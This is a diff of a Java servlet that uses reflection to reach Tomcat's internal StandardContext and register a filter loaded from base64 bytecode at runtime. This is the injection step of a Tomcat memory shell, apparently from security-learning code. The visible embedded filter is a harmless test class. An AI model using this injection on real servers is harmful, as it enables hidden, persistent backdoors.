@@ -21,11 +21,12 @@ import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
 
-import static com.summer233.DynamicUtils.FILTER_CLASS_STRING;
+// import static com.summer233.DynamicUtils.FILTER_CLASS_STRING;
+import static com.summer233.DynamicUtils.BASIC_FILTER_CLASS_STRING_BASE64;
 
 /**
  * 访问这个 Servlet 将会动态添加自定义 Filter
- * 测试版本 Tomcat/9.0.95; Tomcat 8.5.31(原作者su18)
+ * 测试版本 Tomcat/9.0.95(tomcat:9 docker); Tomcat 8.5.31(原作者su18)
  * Tomcat 7 包位置不同
  * import org.apache.catalina.deploy.FilterDef;
  * import org.apache.catalina.deploy.FilterMap;
@@ -47,7 +48,7 @@ public class AddTomcatFilter extends HttpServlet {
             // writer.println("调试信息打印测试:开始执行添加Filter的流程<br>");
             writer.println("debug info print test: start to add filter<br>");
 
-            String filterName = "su18Filter";
+            String filterName = "summerBasicFilter";
             // 从 request 中获取 servletContext
             ServletContext servletContext = req.getServletContext();
 
@@ -55,16 +56,22 @@ public class AddTomcatFilter extends HttpServlet {
             if (servletContext.getFilterRegistration(filterName) == null) {
 
                 StandardContext o = null;
-
                 // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                 while (o == null) {
+                    // 使用 Java 反射机制从 servletContext 对象中获取名为 context 的字段
                     Field f = servletContext.getClass().getDeclaredField("context");
+                    // 将字段的可访问性设置为 true，即使该字段是私有的以允许后续代码访问和修改该字段的值
                     f.setAccessible(true);
+                    // 获取 context 字段的值
                     Object object = f.get(servletContext);
 
+                    // 如果 object 是 ServletContext 的实例，则将 object 强制转换为 ServletContext 类型，并赋值给
+                    // servletContext 变量
                     if (object instanceof ServletContext) {
                         servletContext = (ServletContext) object;
                     } else if (object instanceof StandardContext) {
+                        // 如果 object 是 StandardContext 的实例，则将 object 强制转换为 StandardContext 类型，并赋值给 o
+                        // 变量从而达成目的
                         o = (StandardContext) object;
                     }
                 }
@@ -72,7 +79,8 @@ public class AddTomcatFilter extends HttpServlet {
                 // 创建自定义 Filter 对象
                 // String FILTER_CLASS_STRING =
                 // "yv66vgAAADQANwoABwAiCwAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHAC0HAC4BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwACQAKBwAvDAAwADEBAA90aGlzIGlzIEZpbHRlciAHADIMADMANAcANQwAFAA2AQAob3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAAYABwABAAgAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQABAAsAAAA1AAAAAgAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAFgACAAAAAQAOAA8AAAAAAAEAEgATAAEAAQAUABUAAgALAAAAZAADAAQAAAAULLkAAgEAEgO2AAQtKyy5AAUDALEAAAACAAwAAAAOAAMAAAAfAAsAIQATACIADQAAACoABAAAABQADgAPAAAAAAAUABYAFwABAAAAFAAYABkAAgAAABQAGgAbAAMAHAAAAAYAAgAdAB4AAQAfAAoAAQALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAACkADQAAAAwAAQAAAAEADgAPAAAAAQAgAAAAAgAh";
-                Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);
+                // Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);
+                Class<?> filterClass = DynamicUtils.getClass(BASIC_FILTER_CLASS_STRING_BASE64);
 
                 // 创建 FilterDef 对象
                 FilterDef filterDef = new FilterDef();
